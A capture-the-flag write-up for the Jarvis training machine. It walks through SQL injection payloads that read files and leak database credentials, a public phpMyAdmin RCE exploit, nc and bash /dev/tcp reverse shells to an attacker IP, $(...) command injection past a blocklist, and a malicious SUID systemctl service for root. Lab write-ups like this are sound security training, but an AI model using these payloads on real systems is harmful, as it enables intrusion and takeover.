# Jarvis - OSCP boxe

![Untitled](Jarvis%20-%20OSCP%20boxe%20e6e08c1c55764aebb9c9515499eadec8/Untitled.png)

## **Scanning :**

Lets use nmap to see open ports and services behind the ports : 

```sql
> nmap -sV -sC -T4 -sS 10.10.10.143 

22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Scan all ports : 

```sql
> nmap --max-retries 1 -n -T5 -Pn 10.10.10.143

22/tcp open  ssh
80/tcp open  http
```

## **Enumeration :**

Lets run gobuster to brute force the hidden directory of the web server. 

```sql
> gobuster dir -u http://10.10.10.143 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t50

/css                  (Status: 301) [Size: 310] [--> http://10.10.10.143/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.10.143/js/]
/images               (Status: 301) [Size: 313] [--> http://10.10.10.143/images/]
/fonts                (Status: 301) [Size: 312] [--> http://10.10.10.143/fonts/]
/phpmyadmin           (Status: 301) [Size: 317] [--> http://10.10.10.143/phpmyadmin/]
/sass                 (Status: 301) [Size: 311] [--> http://10.10.10.143/sass/]
/server-status        (Status: 403) [Size: 277]

```

Lets use Whatweb to find some informations about the frontend and the backend of the web site. 

```sql
> whatweb -a 3 http://10.10.10.143                                                     
http://10.10.10.143 [200 OK] Apache[2.4.25], Bootstrap[3.3.5], Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[supersecurehotel@logger.htb], HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.10.10.143], JQuery, Modernizr[2.6.2.min], Open-Graph-Protocol, Script, Title[Stark Hotel], UncommonHeaders[ironwaf], X-UA-Compatible[IE=edge]
```

We found a domain and an email adress lets add the hostname to the /etc/hosts file. 

```sql
echo "10.10.10.143 logger.htb" >> /etc/hosts
```

Whatweb have detected an Uncommon header `ironwaf` , maybe a waf is up on this web site lets try to detect what is it. 

```sql
> wafw00f http://10.10.10.143

                ______
               /      \                                                                                                                                                                                                                     
              (  W00f! )                                                                                                                                                                                                                    
               \  ____/                                                                                                                                                                                                                     
               ,,    __            404 Hack Not Found                                                                                                                                                                                       
           |`-.__   / /                      __     __                                                                                                                                                                                      
           /"  _/  /_/                       \ \   / /                                                                                                                                                                                      
          *===*    /                          \ \_/ /  405 Not Allowed                                                                                                                                                                      
         /     )__//                           \   /                                                                                                                                                                                        
    /|  /     /---`                        403 Forbidden                                                                                                                                                                                    
    \\/`   \ |                                 / _ \                                                                                                                                                                                        
    `\    /_\\_              502 Bad Gateway  / / \ \  500 Internal Error                                                                                                                                                                   
      `_____``-`                             /_/   \_\                                                                                                                                                                                      
                                                                                                                                                                                                                                            
                        ~ WAFW00F : v2.2.0 ~                                                                                                                                                                                                
        The Web Application Firewall Fingerprinting Toolkit                                                                                                                                                                                 
                                                                                                                                                                                                                                            
[*] Checking http://10.10.10.143
[+] Generic Detection results:
[-] No WAF detected by the generic detection
[~] Number of requests: 7

```

## **Exploiting SQLI :**

I found this page with a parameter named **cod**. 

![Untitled](Jarvis%20-%20OSCP%20boxe%20e6e08c1c55764aebb9c9515499eadec8/Untitled%201.png)

I try to put some sqli but that dosent works so i try with sqlmap. 

```sql
> sqlmap -u http://10.10.10.143/room.php?cod=* --level 5 --risk 3
```

the result of sqlmap is positive the cod parameter is vulnerable to sqli. 

```sql
sqlmap identified the following injection point(s) with a total of 264 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: http://10.10.10.143/room.php?cod=-4966 OR 4374=4374

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace
    Payload: http://10.10.10.143/room.php?cod=(CASE WHEN (4223=4223) THEN SLEEP(5) ELSE 4223 END)

    Type: UNION query
    Title: Generic UNION query (random number) - 7 columns
    Payload: http://10.10.10.143/room.php?cod=-8998 UNION ALL SELECT 5730,5730,5730,CONCAT(0x7178707071,0x63667a7662754c637353594274754f62514a5358786a4f6b4f6c4a6b755155426547634a714a6a53,0x717a7a6271),5730,5730,5730-- -
```

Lets try to exploit this vuln without sqlmap. 

I see that sqlmap tells us that we can make a sqli based on the union I try it because I’m really bad at sqli. So frist we need to found who many colomn have the table. 

```sql
> ?cod=13 UNION SELECT 1,2,3,4,5,6,7-- -+
```

We found the tables have 7 columns we can now for exemple dump the db version. 

```sql
> ?cod=13 UNION SELECT 1,2,3,4,@@version,6,7-- -+
```

![Untitled](Jarvis%20-%20OSCP%20boxe%20e6e08c1c55764aebb9c9515499eadec8/Untitled%202.png)

Lets try to get informations about the databases.

```sql
> ?cod=13 UNION SELECT 1,2,(select group_concat(schema_name)from INFORMATION_SCHEMA.SCHEMATA),4,5,6,7 -- -+

# or see the current database
13 UNION SELECT 1,2,3,4,database(),6,7-- -+
```

Lets get enumerate table in databases. 

```sql
> ?cod=13 UNION SELECT 1,2,table_name,4,table_schema,6,7 from INFORMATION_SCHEMA.TABLES order by 3-- -+
```

![Untitled](Jarvis%20-%20OSCP%20boxe%20e6e08c1c55764aebb9c9515499eadec8/Untitled%203.png)

The account tables may contain some identification information, so let’s try to get information on it. 

```sql
> ?cod=13 UNION SELECT 1,2,(select group_concat(column_name)),4,5,6,7 from INFORMATION_SCHEMA.COLUMNS-- -+
```

![Untitled](Jarvis%20-%20OSCP%20boxe%20e6e08c1c55764aebb9c9515499eadec8/Untitled%204.png)

But After lot of search it was not the right way. If I list my current user of the db I realize that I am dbadmin on the mysql service

```sql
> ?cod=13 UNION SELECT 1,2,3,user(),5,6,7 -- - +
```

![Untitled](Jarvis%20-%20OSCP%20boxe%20e6e08c1c55764aebb9c9515499eadec8/Untitled%205.png)

Lets try to read some file to get LFI from sqli because i think my user have right to do. 

```sql
> ?cod=13 UNION SELECT 1,2,3,(LOAD_FILE("/etc/passwd")),5,6,7 -- - 
```

![Untitled](Jarvis%20-%20OSCP%20boxe%20e6e08c1c55764aebb9c9515499eadec8/Untitled%206.png)

When I try to read php code the application return nothing, it is probably a code of certain tags in php code, tried to encode the output in [b64](http://b64.to) to get some result. 

```sql
> ?cod=13 UNION SELECT 1,2,3,(TO_base64(LOAD_FILE("/var/www/html/room.php"))),5,6,7 -- -+
```

![Untitled](Jarvis%20-%20OSCP%20boxe%20e6e08c1c55764aebb9c9515499eadec8/Untitled%207.png)

So a run a new gobuster brute force but this time I try to find some php file. 

```sql
> gobuster dir -u http://10.10.10.143 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t50 -x php 

/nav.php              (Status: 200) [Size: 1333]
/footer.php           (Status: 200) [Size: 2237]
/.php                 (Status: 403) [Size: 277]
/css                  (Status: 301) [Size: 310] [--> http://10.10.10.143/css/]
/images               (Status: 301) [Size: 313] [--> http://10.10.10.143/images/]
/index.php            (Status: 200) [Size: 23628]
/js                   (Status: 301) [Size: 309] [--> http://10.10.10.143/js/]
/fonts                (Status: 301) [Size: 312] [--> http://10.10.10.143/fonts/]
/phpmyadmin           (Status: 301) [Size: 317] [--> http://10.10.10.143/phpmyadmin/]
/connection.php       (Status: 200) [Size: 0]
/room.php             (Status: 302) [Size: 3024] [--> index.php]
/.php                 (Status: 403) [Size: 277]
/sass                 (Status: 301) [Size: 311] [--> http://10.10.10.143/sass/]
/server-status        (Status: 403) [Size: 277]

```

Lets try to get the php code of `connection.php`

```sql
?cod=13 UNION SELECT 1,2,3,(TO_base64(LOAD_FILE("/var/www/html/connection.php"))),5,6,7 -- -+
```

![Untitled](Jarvis%20-%20OSCP%20boxe%20e6e08c1c55764aebb9c9515499eadec8/Untitled%208.png)

Decode the b64. 

```sql
PD9waHAKJGNvbm5lY3Rpb249bmV3IG15c3FsaSgnMTI3LjAuMC4xJywnREJhZG1pbicsJ2ltaXNz
eW91JywnaG90ZWwnKTsKPz4K

# decode form
<?php $connection=new mysqli('127.0.0.1','DBadmin','imissyou','hotel');?>
```

With this credential we log in to phpmyadmin page. 

![Untitled](Jarvis%20-%20OSCP%20boxe%20e6e08c1c55764aebb9c9515499eadec8/Untitled%209.png)

## **Get RCE on PhpMyAdmin :**

After a quick search I find the version a phpmyadmin it is `4.8.0` so I search some know vulnerabilities on this version and I found this exploit db exploit. 

[phpMyAdmin 4.8.1 - Remote Code Execution (RCE)](https://www.exploit-db.com/exploits/50457)

So download it using searchsploit. 

```sql
> searchsploit -m 50457.py
```

Launch the exploit and get RCE.

```sql
> python 50457.py 10.10.10.143 80 /phpmyadmin DBadmin imissyou id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Get reverse shell. 

```sql
> python 50457.py 10.10.10.143 80 /phpmyadmin DBadmin imissyou 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.9 1234 >/tmp/f' 
```

## **Privileges Escalation www-data ⇒ pepper :**

I run a linpeas on the target and i find this priv esc way. 

![Untitled](Jarvis%20-%20OSCP%20boxe%20e6e08c1c55764aebb9c9515499eadec8/Untitled%2010.png)

The binary systemctl is configured to suid we can easly exploit this but we do not have the right to execute this binary. 

```bash
> ls -l /bin/systemctl
-rwsr-x--- 1 root pepper 174520 Jun 29  2022 /bin/systemctl
```

Enumerate sudo right of the user.

```jsx
> sudo -l 

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
```

lets see what is this python script. On this on fonction is interresting. 

```python
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)
```

As you can see this fonction take an input from the user, it attents an ip, to try to secure the thing the creator has added a filter that will browse the string send to user if the one if contains separators commands bash then we do not pass the filter. 

I try to find some payload and cheat sheet. 

[Hacker's Guide](https://yolospacehacker.com/hackersguide/fr/?cat=cmdinjection)

In this cheat sheet I see that it is possible to force a command execution with the following syntax `$(command)` . 

```bash
> sudo -u pepper /var/www/Admin-Utilities/simpler.py -p

Enter an IP: $(id)
#result
ping: groups=1000(pepper): Temporary failure in name resolution
```

This work we get the output succefully, now get reverse shell. 

```bash
#Create a file with bash reverse shell payload 
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.9/4444 0>&1

# give it the exec right
> chmod +x shell.sh

# launch rce
> sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
Enter an IP: $(bash /tmp/shell.sh)
```

We can now exploit the SUID binary systemctl is real simple, to start create a file named shell.service. 

```bash
touch shell.service

# paste that in there, juste change the ip adresse
[Unit]
Description=roooooooooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.9/9999 0>&1'

[Install]
WantedBy=multi-user.target
```

Uplaod this file on the target on the `/home/pepper` directory and enable the new malicious service. 

```jsx
> /bin/systemctl enable /home/pepper/shell.service
```

Now start the service do not forget to your nc listener.

```jsx
> nc -lnvp 9999

# start malicious service
> /bin/systemctl start shell
```

![Untitled](Jarvis%20-%20OSCP%20boxe%20e6e08c1c55764aebb9c9515499eadec8/Untitled%2011.png)

GG ! Realy nice boxe i love exploit SQLI and understand what I'm doing 😆.